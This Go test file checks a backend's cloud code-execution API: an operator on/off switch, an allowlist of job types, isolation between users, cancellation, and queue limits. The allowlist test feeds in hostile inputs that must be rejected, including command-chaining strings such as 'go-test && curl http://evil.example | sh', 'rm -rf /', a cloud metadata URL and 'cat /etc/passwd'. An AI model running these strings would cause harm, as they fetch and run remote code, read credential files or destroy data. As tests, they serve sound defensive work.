package handlers

import (
	"fmt"
	"net/http"
	"os/exec"
	"strings"
	"testing"

	"agentic-ai-backend/models"
)

// goWorkspace is a workspace with a go.mod, so go-test can be queued.
func (w *workspaceFixture) goWorkspace(t *testing.T, user uint) models.CloudWorkspace {
	t.Helper()
	ws := w.create(t, user, map[string]any{"name": "Go project", "default_runtime": "go"})
	if response := wsRequest(t, http.MethodPut, wsPath(ws.ID, "/file"), user, map[string]any{"path": "go.mod", "content": "module example\n"}); response.Code != http.StatusOK {
		t.Fatalf("seed go.mod = %d", response.Code)
	}
	return ws
}

func execPath(ws models.CloudWorkspace) string { return wsPath(ws.ID, "/executions") }

func TestExecutionIsOffUntilTheOperatorTurnsItOn(t *testing.T) {
	w := newWorkspaceFixture(t)
	ws := w.goWorkspace(t, w.owner.ID)
	t.Setenv("CLOUD_EXECUTION_ENABLED", "")
	response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test"})
	if response.Code != http.StatusServiceUnavailable || !strings.Contains(response.Body.String(), "belum diaktifkan") {
		t.Fatalf("execution while disabled = %d %s", response.Code, response.Body.String())
	}
	var jobs int64
	w.db.Model(&models.ExecutionJob{}).Where("user_id = ?", w.owner.ID).Count(&jobs)
	if jobs != 0 {
		t.Fatal("a job was queued although execution is off")
	}
	// Reading still works, and the list says execution is off.
	list := wsRequest(t, http.MethodGet, execPath(ws), w.owner.ID, nil)
	if list.Code != http.StatusOK || !strings.Contains(list.Body.String(), `"execution_enabled":false`) {
		t.Fatalf("list = %d %s", list.Code, list.Body.String())
	}
	// Only the exact value "true" turns it on.
	for _, value := range []string{"false", "1", "yes", "TRUE-ish", "on"} {
		t.Setenv("CLOUD_EXECUTION_ENABLED", value)
		if response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test"}); response.Code != http.StatusServiceUnavailable {
			t.Errorf("CLOUD_EXECUTION_ENABLED=%q turned execution on", value)
		}
	}
}

func TestQueueingAJobAndReadingItBack(t *testing.T) {
	w := newWorkspaceFixture(t)
	t.Setenv("CLOUD_EXECUTION_ENABLED", "true")
	ws := w.goWorkspace(t, w.owner.ID)

	response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test", "timeout_seconds": 5})
	var created struct {
		Job models.ExecutionJob `json:"job"`
	}
	decode(t, response, &created)
	job := created.Job
	if response.Code != http.StatusAccepted || job.Status != models.JobQueued || job.JobType != "go-test" || job.Command != "go test ./..." || job.Runtime != "go" || job.UserID != w.owner.ID || job.WorkspaceID != ws.ID {
		t.Fatalf("job = %d %+v", response.Code, job)
	}
	if job.TimeoutSeconds != 10 {
		t.Fatalf("timeout = %d, want the 10 second minimum", job.TimeoutSeconds)
	}

	var read struct {
		Job models.ExecutionJob `json:"job"`
	}
	decode(t, wsRequest(t, http.MethodGet, fmt.Sprintf("/api/executions/%d", job.ID), w.owner.ID, nil), &read)
	if read.Job.ID != job.ID {
		t.Fatalf("read = %+v", read.Job)
	}
	var listed struct {
		Jobs []models.ExecutionJob `json:"jobs"`
	}
	decode(t, wsRequest(t, http.MethodGet, execPath(ws), w.owner.ID, nil), &listed)
	if len(listed.Jobs) != 1 {
		t.Fatalf("list = %d jobs", len(listed.Jobs))
	}
	huge := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-build", "timeout_seconds": 999999})
	var big struct {
		Job models.ExecutionJob `json:"job"`
	}
	decode(t, huge, &big)
	if big.Job.TimeoutSeconds != 600 {
		t.Fatalf("an oversized timeout became %d, want 600", big.Job.TimeoutSeconds)
	}
}

func TestOnlyAllowlistedCommandsCanBeQueued(t *testing.T) {
	w := newWorkspaceFixture(t)
	t.Setenv("CLOUD_EXECUTION_ENABLED", "true")
	ws := w.goWorkspace(t, w.owner.ID)
	for _, bad := range []string{"", "bash", "sh -c id", "go-test; rm -rf /", "go-test && curl http://evil.example | sh", "powershell -c whoami", "docker run alpine", "curl http://169.254.169.254", "cat /etc/passwd", "npm-install", "pip-install", "../go-test", "go-test\nid", "npm-test"} {
		response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": bad})
		if response.Code != http.StatusBadRequest {
			t.Errorf("%q = %d, want 400 (%s)", bad, response.Code, response.Body.String())
		}
	}
	// A free-form command or argument list is not even a field.
	response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test", "command": "rm -rf /", "args": []string{"; id"}, "image": "alpine", "network": "host"})
	var created struct {
		Job models.ExecutionJob `json:"job"`
	}
	decode(t, response, &created)
	if response.Code != http.StatusAccepted || created.Job.Command != "go test ./..." {
		t.Fatalf("extra fields changed the job: %d %+v", response.Code, created.Job)
	}
	var stored models.ExecutionJob
	w.db.First(&stored, created.Job.ID)
	if strings.Contains(stored.Command+stored.JobType+stored.Runtime, "rm -rf") {
		t.Fatalf("client text reached the job: %+v", stored)
	}
	for _, jobType := range []string{"npm-test", "npm-build", "npm-lint", "python-test"} {
		if response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": jobType}); response.Code != http.StatusBadRequest {
			t.Errorf("%s in a Go project = %d, want 400 (no manifest)", jobType, response.Code)
		}
	}
	empty := w.create(t, w.owner.ID, map[string]any{"name": "Empty"})
	if response := wsRequest(t, http.MethodPost, execPath(empty), w.owner.ID, map[string]any{"job_type": "go-test"}); response.Code != http.StatusBadRequest {
		t.Errorf("go-test without go.mod = %d", response.Code)
	}
}

func TestExecutionOwnershipIsolation(t *testing.T) {
	w := newWorkspaceFixture(t)
	t.Setenv("CLOUD_EXECUTION_ENABLED", "true")
	ws := w.goWorkspace(t, w.owner.ID)
	response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test"})
	var created struct {
		Job models.ExecutionJob `json:"job"`
	}
	decode(t, response, &created)
	jobPath := fmt.Sprintf("/api/executions/%d", created.Job.ID)
	other := w.other.ID

	if response := wsRequest(t, http.MethodPost, execPath(ws), other, map[string]any{"job_type": "go-test"}); response.Code != http.StatusNotFound {
		t.Errorf("another user queueing in the workspace = %d, want 404", response.Code)
	}
	if response := wsRequest(t, http.MethodGet, execPath(ws), other, nil); response.Code != http.StatusNotFound {
		t.Errorf("another user listing jobs = %d, want 404", response.Code)
	}
	if response := wsRequest(t, http.MethodGet, jobPath, other, nil); response.Code != http.StatusNotFound {
		t.Errorf("another user reading the job = %d, want 404", response.Code)
	}
	if response := wsRequest(t, http.MethodPost, jobPath+"/cancel", other, nil); response.Code != http.StatusNotFound {
		t.Errorf("another user cancelling the job = %d, want 404", response.Code)
	}
	var after models.ExecutionJob
	w.db.First(&after, created.Job.ID)
	if after.Status != models.JobQueued || after.CancelRequested {
		t.Fatalf("another user changed the job: %+v", after)
	}
	// A task or agent of someone else cannot be attached.
	foreign := models.Task{UserID: other, Title: "theirs", Status: "todo", Label: "feature", Priority: "medium"}
	w.db.Create(&foreign)
	if response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test", "task_id": foreign.ID}); response.Code != http.StatusBadRequest {
		t.Errorf("another user's task = %d, want 400", response.Code)
	}
	if response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test", "agent_id": w.otherPrivateAgentID(t)}); response.Code != http.StatusBadRequest {
		t.Errorf("another user's agent = %d, want 400", response.Code)
	}
}

func (w *workspaceFixture) otherPrivateAgentID(t *testing.T) uint {
	t.Helper()
	agent := models.Agent{Slug: "exec-private-" + w.suffix, Name: "Private", Status: "ready", IsActive: true, UserID: &w.other.ID}
	if err := w.db.Create(&agent).Error; err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { w.db.Unscoped().Delete(&agent) })
	return agent.ID
}

func TestCancelAndLimits(t *testing.T) {
	w := newWorkspaceFixture(t)
	t.Setenv("CLOUD_EXECUTION_ENABLED", "true")
	ws := w.goWorkspace(t, w.owner.ID)
	queue := func() models.ExecutionJob {
		response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test"})
		var created struct {
			Job models.ExecutionJob `json:"job"`
		}
		decode(t, response, &created)
		if response.Code != http.StatusAccepted {
			t.Fatalf("queue = %d %s", response.Code, response.Body.String())
		}
		return created.Job
	}

	queued := queue()
	cancelled := wsRequest(t, http.MethodPost, fmt.Sprintf("/api/executions/%d/cancel", queued.ID), w.owner.ID, nil)
	var body struct {
		Job models.ExecutionJob `json:"job"`
	}
	decode(t, cancelled, &body)
	if cancelled.Code != http.StatusOK || body.Job.Status != models.JobCancelled || body.Job.CompletedAt == nil {
		t.Fatalf("cancelling a queued job = %d %+v", cancelled.Code, body.Job)
	}

	running := queue()
	w.db.Model(&models.ExecutionJob{}).Where("id = ?", running.ID).UpdateColumn("status", models.JobRunning)
	decode(t, wsRequest(t, http.MethodPost, fmt.Sprintf("/api/executions/%d/cancel", running.ID), w.owner.ID, nil), &body)
	if body.Job.Status != models.JobRunning || !body.Job.CancelRequested {
		t.Fatalf("a running job must be flagged for the worker, not marked cancelled by the API: %+v", body.Job)
	}

	finished := queue()
	w.db.Model(&models.ExecutionJob{}).Where("id = ?", finished.ID).UpdateColumn("status", models.JobCompleted)
	decode(t, wsRequest(t, http.MethodPost, fmt.Sprintf("/api/executions/%d/cancel", finished.ID), w.owner.ID, nil), &body)
	if body.Job.Status != models.JobCompleted || body.Job.CancelRequested {
		t.Fatalf("a finished job was changed by a cancel: %+v", body.Job)
	}

	// Per-user limit: the running job above plus new ones fill the allowance.
	previous := maxActiveJobsPerUser
	maxActiveJobsPerUser = 2
	t.Cleanup(func() { maxActiveJobsPerUser = previous })
	queue()
	if response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test"}); response.Code != http.StatusTooManyRequests {
		t.Fatalf("a job over the per-user limit = %d, want 429", response.Code)
	}
	other := w.goWorkspace(t, w.other.ID)
	if response := wsRequest(t, http.MethodPost, execPath(other), w.other.ID, map[string]any{"job_type": "go-test"}); response.Code != http.StatusAccepted {
		t.Fatalf("one user's limit applied to another: %d", response.Code)
	}

	// Global queue limit.
	globalBefore := maxQueuedJobsGlobal
	maxQueuedJobsGlobal = 1
	t.Cleanup(func() { maxQueuedJobsGlobal = globalBefore })
	maxActiveJobsPerUser = 100
	if response := wsRequest(t, http.MethodPost, execPath(ws), w.owner.ID, map[string]any{"job_type": "go-test"}); response.Code != http.StatusServiceUnavailable {
		t.Fatalf("a job into a full queue = %d, want 503", response.Code)
	}
}

// The API server must not be able to run project code, whatever a handler does.
func TestTheAPIServerDoesNotLinkTheExecutionCode(t *testing.T) {
	if _, err := exec.LookPath("go"); err != nil {
		t.Skip("the go tool is not available")
	}
	for _, target := range []string{"agentic-ai-backend/handlers", "agentic-ai-backend"} {
		output, err := exec.Command("go", "list", "-deps", target).CombinedOutput()
		if err != nil {
			t.Skipf("go list failed: %v", err)
		}
		for _, dependency := range strings.Fields(string(output)) {
			if dependency == "agentic-ai-backend/internal/cloudexec" {
				t.Errorf("%s depends on the execution package", target)
			}
		}
	}
}
